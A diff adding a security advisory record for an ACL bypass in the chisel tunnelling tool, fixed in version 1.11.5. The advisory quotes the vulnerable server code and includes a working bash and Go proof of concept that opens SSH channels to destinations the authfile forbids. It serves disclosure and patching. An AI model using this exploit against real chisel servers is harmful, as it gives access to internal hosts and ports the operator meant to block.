@@ -1,0 +1,46 @@
+{
+  "id": "GHSA-24fp-5v3p-rvpw",
+  "modified": "2026-06-12T15:15:20.894854608Z",
+  "published": "2026-06-12T15:04:37Z",
+  "aliases": [
+    "CVE-2026-48113"
+  ],
+  "summary": "Chisel has an ACL Bypass via Post-Handshake SSH Channel ExtraData Injection",
+  "details": "### Summary\n\nAuthenticated chisel clients can bypass `--authfile` ACL restrictions and tunnel traffic to arbitrary destinations reachable from the server. The ACL is enforced only during the initial handshake against declared remotes, but never on subsequent SSH channels that carry actual traffic. A malicious client authenticates with a permitted remote, then opens channels to any `host:port` it wants.\n\n\n### Details\nThe chisel server validates user ACLs in two places but is missing validation in one of the important places.\n\nThe `server/server_handler.go` checks the ACL, during the initial config handshake:\n\n```go\nfor _, r := range c.Remotes {\n    if user != nil {\n        addr := r.UserAddr()\n        if !user.HasAccess(addr) {\n            failed(s.Errorf(\"access to '%s' denied\", addr))\n            return\n        }\n    }\n}\nr.Reply(true, nil)\n```\n\nThis validates the declared remote list from the client's config request. It runs once, at connection setup. But in `share/tunnel/tunnel_out_ssh.go` ACL aren't being checked, when the server processes actual traffic channels:\n\n```go\nfunc (t *Tunnel) handleSSHChannel(ch ssh.NewChannel) {\n    remote := string(ch.ExtraData())        // client-controlled\n    hostPort, proto := settings.L4Proto(remote)\n    sshChan, reqs, err := ch.Accept()       // accepted unconditionally\n    // ...\n    err = t.handleTCP(l, stream, hostPort)  // dials whatever client said\n}\n\nfunc (t *Tunnel) handleTCP(l *cio.Logger, src io.ReadWriteCloser, hostPort string) error {\n    dst, err := net.Dial(\"tcp\", hostPort)   // no ACL check\n    // ...\n}\n```\n\nThe `tunnel.Config` struct has no User field, no allowed-address list, and no ACL callback. The user context from `server_handler.go` is never propagated to the tunnel layer:\n\n```go\ntype Config struct {\n    *cio.Logger\n    Inbound   bool\n    Outbound  bool\n    Socks     bool\n    KeepAlive time.Duration\n    // ------- No User, no AllowedRemotes, no ACL\n}\n```\nSince `ch.ExtraData()` is fully controlled by the SSH client, any authenticated user can open channels to arbitrary destinations after passing the handshake with a permitted remote.\n\n\n### PoC\n\nDirectory structure format:\n```\npoc\n├── poc.sh\n└── probe\n    ├── go.mod\n    ├── go.sum\n    └── main.go\n```\n\n- `poc.sh`\n\n```bash\n#!/usr/bin/env bash\n\n# Requires: Go, nc (netcat)\n\nset -euo pipefail\nDIR=\"$(cd \"$(dirname \"$0\")\" \u0026\u0026 pwd)\"\nREPO=\"$DIR/..\"\n\nfreeport() { python3 -c \"import socket;s=socket.socket();s.bind(('',0));print(s.getsockname()[1]);s.close()\"; }\ncleanup() { kill $SERVER $LISTENER 2\u003e/dev/null; rm -f \"$AUTH\"; }\ntrap cleanup EXIT\n\n# Build\necho \"[*] Building...\"\n(cd \"$REPO\"       \u0026\u0026 go build -o /tmp/_chisel .)\n(cd \"$DIR/probe\"  \u0026\u0026 go build -o /tmp/_probe  .)\n\n# Ports\nSP=$(freeport); AP=$(freeport); BP=$(freeport)\necho \"[*] Server :$SP  Allowed :$AP  Blocked :$BP\"\n\n# Authfile — user:pass may only reach 127.0.0.1:$AP\nAUTH=$(mktemp)\nprintf '{\"user:pass\":[\"^127\\\\\\\\.0\\\\\\\\.0\\\\\\\\.1:%s$\"]}\\n' \"$AP\" \u003e \"$AUTH\"\n\n# Start forbidden-target listener and chisel server\n(echo \"FORBIDDEN_TARGET_REACHED\" | nc -l 127.0.0.1 \"$BP\") \u0026 LISTENER=$!\n/tmp/_chisel server --port \"$SP\" --authfile \"$AUTH\" --key seed 2\u003e/dev/null \u0026 SERVER=$!\nsleep 1\n\n# Exploit\nCHISEL_SERVER=\"127.0.0.1:$SP\" ALLOWED_PORT=\"$AP\" BLOCKED_PORT=\"$BP\" /tmp/_probe\n```\n\n- `main.go`\n\n```go\n// Chisel ACL bypass probe. Authenticates with an allowed remote,\n// then opens an SSH channel to a forbidden destination via ExtraData.\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"net\"\n\t\"net/http\"\n\t\"os\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n\t\"github.com/jpillora/chisel/share/cnet\"\n\t\"github.com/jpillora/chisel/share/settings\"\n\t\"golang.org/x/crypto/ssh\"\n)\n\nfunc main() {\n\tserver := os.Getenv(\"CHISEL_SERVER\")\n\tallowed := os.Getenv(\"ALLOWED_PORT\")\n\tblocked := os.Getenv(\"BLOCKED_PORT\")\n\n\t// WebSocket → net.Conn\n\tws, _, err := (\u0026websocket.Dialer{\n\t\tHandshakeTimeout: 5 * time.Second,\n\t\tSubprotocols:     []string{\"chisel-v3\"},\n\t}).Dial(\"ws://\"+server, http.Header{})\n\tcheck(err, \"ws dial\")\n\tconn := cnet.NewWebSocketConn(ws)\n\n\t// SSH handshake\n\tsc, chans, reqs, err := ssh.NewClientConn(conn, \"\", \u0026ssh.ClientConfig{\n\t\tUser:            \"user\",\n\t\tAuth:            []ssh.AuthMethod{ssh.Password(\"pass\")},\n\t\tHostKeyCallback: ssh.InsecureIgnoreHostKey(),\n\t})\n\tcheck(err, \"ssh\")\n\tgo ssh.DiscardRequests(reqs)\n\tgo func() { for c := range chans { c.Reject(ssh.Prohibited, \"\") } }()\n\n\t// Send config with only the allowed remote\n\tr, _ := settings.DecodeRemote(fmt.Sprintf(\"0.0.0.0:%s:127.0.0.1:%s\", allowed, allowed))\n\tcfg, _ := json.Marshal(settings.Config{Version: \"0\", Remotes: []*settings.Remote{r}})\n\tok, reply, err := sc.SendRequest(\"config\", true, cfg)\n\tcheck(err, \"config\")\n\tif !ok {\n\t\tdie(\"config rejected: %s\", reply)\n\t}\n\tfmt.Printf(\"[+] Config accepted (only 127.0.0.1:%s allowed)\\n\", allowed)\n\n\t// Open channel to BLOCKED destination\n\ttarget := net.JoinHostPort(\"127.0.0.1\", blocked)\n\tch, cr, err := sc.OpenChannel(\"chisel\", []byte(target))\n\tif err != nil {\n\t\tfmt.Printf(\"[-] REJECTED — server refused %s\\n\", target)\n\t\tos.Exit(1)\n\t}\n\tgo ssh.DiscardRequests(cr)\n\tfmt.Printf(\"[!] ACCEPTED — channel opened to %s\\n\", target)\n\n\t// Read response from forbidden target\n\tbuf := make([]byte, 256)\n\tdone := make(chan int, 1)\n\tgo func() { n, _ := ch.Read(buf); done \u003c- n }()\n\tselect {\n\tcase n := \u003c-done:\n\t\tif n \u003e 0 {\n\t\t\tfmt.Printf(\"[!] Data: %s\\n\", buf[:n])\n\t\t}\n\tcase \u003c-time.After(3 * time.Second):\n\t}\n\tfmt.Println(\"CONFIRMED — ACL bypass: server dialed unauthorized destination\")\n\tch.Close()\n\tsc.Close()\n}\n\nfunc check(err error, ctx string) {\n\tif err != nil {\n\t\tdie(\"%s: %v\", ctx, err)\n\t}\n}\nfunc die(f string, a ...interface{}) {\n\tfmt.Fprintf(os.Stderr, f+\"\\n\", a...)\n\tos.Exit(1)\n}\n```\n\n### Impact\n\n- Complete ACL bypass: The `--authfile` address restrictions are enforceable only on paper\n-  Authenticated users can reach any host/port the server process can dial",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/jpillora/chisel",
+        "purl": "pkg:golang/github.com/jpillora/chisel"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.11.5"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.11.4",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-24fp-5v3p-rvpw/GHSA-24fp-5v3p-rvpw.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpillora/chisel/security/advisories/GHSA-24fp-5v3p-rvpw"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jpillora/chisel"
+    }
+  ]
+}
